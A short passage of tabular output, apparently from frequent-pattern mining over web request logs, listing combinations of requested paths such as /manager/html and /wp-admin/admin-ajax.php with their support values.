# 118  0.033369                     (/, /manager/html, /index.php)       3
# 119  0.011841          (/, /wp-admin/admin-ajax.php, /index.php)       3
# 120  0.008611                         (/, /login, /manager/html)       3
# 121  0.005382                        (/, /manager/html, /login/)       3
# 122  0.020452       (/, /manager/html, /wp-admin/admin-ajax.php)       3
# 123  0.005382  (/manager/html, /CDGServer3/SystemConfig, /ind...       3
# 124  0.005382                (/manager/html, /login, /index.php)       3
# 125  0.005382  (/manager/html, /wp-admin/admin-ajax.php, /ind...       3
